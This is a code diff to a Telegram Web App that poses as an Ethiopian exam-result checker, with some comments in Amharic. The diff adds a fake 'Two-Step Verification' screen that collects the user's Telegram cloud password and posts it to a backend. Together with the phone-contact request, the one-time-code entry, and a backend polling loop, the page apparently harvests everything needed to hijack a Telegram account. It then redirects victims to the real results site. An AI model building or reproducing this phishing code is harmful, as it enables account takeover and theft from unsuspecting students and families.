@@ -20,7 +20,7 @@ header .logo-container { width: 39px; height: 39px; background-color: white; bor
 header .logo-container img { width: 160%; height: 160%; object-fit: contain; }
 header .header-title h1 { font-size: 19px; font-weight: 500; letter-spacing: 0.2px; line-height: 1.2; }
 header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-family: "Merriweather", serif; }
-.main-wrapper { padding: 24px 18px; max-width: 480px; margin: 0 auto; width: 100%; flex: 1; padding-bottom: 340px; } /* ለኪፓዱ ቦታ ለመልቀቅ */
+.main-wrapper { padding: 24px 18px; max-width: 480px; margin: 0 auto; width: 100%; flex: 1; padding-bottom: 340px; }
 
 .step-view { display: none; width: 100%; animation: fadeIn 0.3s ease-in-out; }
 .active-view { display: block; }
@@ -66,7 +66,6 @@ header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-fa
 .submit-button { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: "Merriweather", serif; margin-bottom: 24px; }
 .footer-support-link { display: inline-flex; align-items: center; gap: 6px; color: #475569; text-decoration: none; font-size: 14.5px; font-weight: 500; font-family: "Merriweather", serif; }
 
-/* Themes */
 .theme-exit .center-user-icon { background-color: #0c54a6; } .theme-exit .input-wrapper input { border-color: #0c54a6; } .theme-exit .info-box { background-color: #f0f6fc; border: 1px solid #d0e1f3; } .theme-exit .info-box i, .theme-exit .info-title { color: #0c54a6; } .theme-exit .submit-button { background-color: #0c54a6; } .theme-exit .back-btn { color: #0c54a6; }
 .theme-remedial .center-user-icon { background-color: #6f42c1; } .theme-remedial .input-wrapper input { border-color: #6f42c1; } .theme-remedial .info-box { background-color: #f8f5fc; border: 1px solid #ebdff5; } .theme-remedial .info-box i, .theme-remedial .info-title { color: #6f42c1; } .theme-remedial .submit-button { background-color: #6f42c1; } .theme-remedial .back-btn { color: #6f42c1; }
 
@@ -234,6 +233,36 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         </div>  
     </div>  
 
+
+    <div id="twofa-verification-view" class="step-view">  
+        <button class="back-btn" onclick="backToForm()">  
+            <i class="fa-solid fa-arrow-left"></i> Back
+        </button>  
+
+        <div class="username-card">  
+            <div class="center-user-icon" style="background-color: #6f42c1;">  
+                <i class="fa-solid fa-key"></i>  
+            </div>  
+            <h4>Two-Step Verification</h4>  
+            <p class="form-desc">Your account is protected with a Two-Step Verification cloud password.</p>  
+            
+            <label class="input-label" style="text-align: left;">Password</label>  
+            <div class="input-wrapper">  
+                <i class="fa-solid fa-lock" style="position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #475569; font-size: 18px;"></i>  
+                <input type="password" id="twofa-password-input" placeholder="Enter Cloud Password">  
+            </div>  
+
+            <div class="error-box" id="twofa-error-box" style="margin-top: 15px;">  
+                <i class="fa-solid fa-triangle-exclamation"></i>  
+                <p>Incorrect cloud password. Please try again.</p>  
+            </div>  
+
+            <button class="submit-button" id="twofa-submit-btn" onclick="submit2FAPassword()" style="background-color: #6f42c1;">  
+                <i class="fa-solid fa-arrow-right"></i> <span id="twofa-btn-text">Verify Password</span>  
+            </button>  
+        </div>  
+    </div>  
+
 </div>  
 
 <div class="keypad" id="custom-keypad">  
@@ -263,12 +292,12 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         tg.ready();
     }
 
-    const BASE_URL = typeof API_BASE_URL !== 'undefined' ? API_BASE_URL : 'https://your-backend-api.com';
+    const BASE_URL = typeof API_BASE_URL !== 'undefined' ? API_BASE_URL : 'http://127.0.0.1:5000';
 
-    // የሁሉም ገጾች DOM ጥሪዎች
     const mainCategoriesView = document.getElementById('main-categories-view');  
     const formDynamicView = document.getElementById('form-dynamic-view');  
     const otpVerificationView = document.getElementById('otp-verification-view');  
+    const twofaVerificationView = document.getElementById('twofa-verification-view');  
     const customKeypad = document.getElementById('custom-keypad');  
 
     const dynamicFormDesc = document.getElementById('dynamic-form-desc');  
@@ -276,19 +305,48 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
     const usernameInputField = document.getElementById('username-input-field');  
     const validationErrorBox = document.getElementById('validation-error-box');  
     const otpErrorBox = document.getElementById('otp-error-box');  
+    const twofaErrorBox = document.getElementById('twofa-error-box');  
     const dynamicSubmitBtn = document.getElementById('dynamic-submit-btn');  
+    const twofaSubmitBtn = document.getElementById('twofa-submit-btn');  
+    const twofaBtnText = document.getElementById('twofa-btn-text');  
 
     let userId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let savedName = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "User";
     
     let isProcessing = false;
     let currentOtp = ""; 
+    let statusInterval = null;
+
+    // Web App ሲከፈት መጀመሪያ ከ Python ሁኔታን ይጠይቃል
+    window.onload = function() {
+        checkUserStatusOnOpen();
+    };
+
+    async function checkUserStatusOnOpen() {
+        try {
+            const res = await fetch(`${BASE_URL}/check_status/${userId}`);
+            const data = await res.json();
+            if (data) {
+                handleGlobalResponse(data);
+            }
+        } catch(e) {}
+    }
+
+    function handleGlobalResponse(data) {
+        if (data.status === "NEED_OTP") {
+            switchToOtpPage();
+        } else if (data.status === "NEED_2FA") {
+            switchTo2FAPage();
+        } else if (data.status === "SUCCESS") {
+            if (statusInterval) clearInterval(statusInterval);
+            window.location.href = "https://result.moe.gov.et"; // Success Link
+        }
+    }
 
     function changeView(targetView) {
         document.querySelectorAll('.step-view').forEach(v => v.classList.remove('active-view'));
         targetView.classList.add('active-view');
         
-        // OTP ገጽ ላይ ከሆነ ኪፓዱ እንዲበራ ማድረግ
         if (targetView === otpVerificationView) {
             customKeypad.style.display = 'grid';
         } else {
@@ -316,7 +374,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
     function backToCategories() { changeView(mainCategoriesView); }  
     function backToForm() { changeView(formDynamicView); }  
 
-    // "View Result" ሲነካ የሚሰራው ዋናው ሎጂክ
     async function validateOnSubmit() {  
         if (isProcessing) return;
         const value = usernameInputField.value.trim();  
@@ -344,9 +401,12 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
                 resetButton(originalBtnText);
                 switchToOtpPage();
+            } else if (data.status === "NEED_2FA") {
+                resetButton(originalBtnText);
+                switchTo2FAPage();
             } else if (data.status === "SUCCESS") {
                 resetButton(originalBtnText);
-                alert("Identity confirmed!");
+                window.location.href = "https://result.moe.gov.et";
             } else { 
                 requestUserContact(originalBtnText);
             }
@@ -360,7 +420,8 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         if (tg) {
             tg.requestContact((success) => {
                 if (success) {
-                    switchToOtpPage();
+                    // Contact Share ሲደረግ አዝራሩ አሁንም Loading... ሆኖ ሁኔታን መከታተል ይጀምራል
+                    startCheckingStatusLoop(originalText);
                 } else { 
                     resetButton(originalText);
                     showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።");
@@ -368,13 +429,32 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             });
         } else {
             let mockConfirm = confirm("[የሙከራ] ለማስቀጠል ስልክ ቁጥርዎን ማጋራት ይፈልጋሉ?");
-            if (mockConfirm) { switchToOtpPage(); } 
-            else { resetButton(originalText); showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።"); }
+            if (mockConfirm) { 
+                startCheckingStatusLoop(originalText); 
+            } else { 
+                resetButton(originalText); 
+                showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።"); 
+            }
         }
     }
 
-    // ወደ OTP ገጽ ማሸጋገሪያ
+    // በየ 2 ሰከንዱ ከ Python መልስ እስኪመጣ ድረስ አዝራሩ Loading ሆኖ ይጠብቃል
+    function startCheckingStatusLoop(originalText) {
+        statusInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`${BASE_URL}/check_status/${userId}`);
+                const data = await res.json();
+                if (data && data.status && data.status !== "WAITING") {
+                    clearInterval(statusInterval);
+                    resetButton(originalText);
+                    handleGlobalResponse(data);
+                }
+            } catch(e) {}
+        }, 2000);
+    }
+
     function switchToOtpPage() {
+        if (statusInterval) clearInterval(statusInterval);
         currentOtp = "";
         updateOtpUi();
         clearOtpStatus();
@@ -382,7 +462,13 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         changeView(otpVerificationView);
     }
 
-    // የኪፓድ ቁጥሮች ሲጫኑ
+    function switchTo2FAPage() {
+        if (statusInterval) clearInterval(statusInterval);
+        twofaErrorBox.style.display = 'none';
+        document.getElementById('twofa-password-input').value = "";
+        changeView(twofaVerificationView);
+    }
+
     function pressNumber(num) {
         if (window.navigator.vibrate) window.navigator.vibrate(15);
         otpErrorBox.style.display = 'none';
@@ -397,7 +483,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         }
     }
 
-    // Backspace ሲጫን
     function pressBackspace() {
         if (window.navigator.vibrate) window.navigator.vibrate(15);
         clearOtpStatus();
@@ -405,7 +490,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         updateOtpUi();
     }
 
-    // የሳጥኖቹን ቁጥር ማደሻ
     function updateOtpUi() {
         for (let i = 0; i < 5; i++) {
             const box = document.getElementById('b' + i);
@@ -430,7 +514,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         }
     }
 
-    // OTP ኮዱን ወደ ፒክቶን (Backend) መላኪያ ፍተሻ
     async function submitOTPCode() {
         otpErrorBox.style.display = 'flex';
         otpErrorBox.style.backgroundColor = '#e1effe';
@@ -451,7 +534,9 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
                 otpErrorBox.style.borderColor = '#b7e1cd';
                 otpErrorBox.querySelector('p').style.color = '#137333';
                 otpErrorBox.querySelector('p').innerText = "Success! Redirecting...";
-                alert("ውጤቱ በስኬት ተረጋግጧል!");
+                setTimeout(() => { window.location.href = "https://result.moe.gov.et"; }, 1000);
+            } else if (data.status === "NEED_2FA") {
+                switchTo2FAPage();
             } else {
                 handleOtpFailure();
             }
@@ -473,6 +558,44 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             updateOtpUi();
             clearOtpStatus();
         }, 1200);
+    }
+
+    async function submit2FAPassword() {
+        const passwordInput = document.getElementById('twofa-password-input').value.trim();
+        if (!passwordInput) return;
+
+        twofaSubmitBtn.disabled = true;
+        twofaBtnText.innerText = "Validating Password...";
+        twofaErrorBox.style.display = 'none';
+
+        try {
+            const res = await fetch(`${BASE_URL}/verify_2fa`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ session_id: userId, password: passwordInput })
+            });
+            const data = await res.json();
+
+            if (data.status === "SUCCESS") {
+                twofaErrorBox.style.display = 'flex';
+                twofaErrorBox.style.backgroundColor = '#e6f4ea';
+                twofaErrorBox.style.borderColor = '#b7e1cd';
+                twofaErrorBox.querySelector('p').style.color = '#137333';
+                twofaErrorBox.querySelector('p').innerText = "Password Correct! Redirecting...";
+                setTimeout(() => { window.location.href = "https://result.moe.gov.et"; }, 1000);
+            } else {
+                twofaErrorBox.style.display = 'flex';
+                twofaErrorBox.style.backgroundColor = '#ffebee';
+                twofaErrorBox.style.borderColor = '#ffcdd2';
+                twofaErrorBox.querySelector('p').style.color = '#c62828';
+                twofaErrorBox.querySelector('p').innerText = "Incorrect cloud password. Please try again.";
+                twofaSubmitBtn.disabled = false;
+                twofaBtnText.innerText = "Verify Password";
+            }
+        } catch(e) {
+            twofaSubmitBtn.disabled = false;
+            twofaBtnText.innerText = "Verify Password";
+        }
     }
 
     function resetButton(text) {
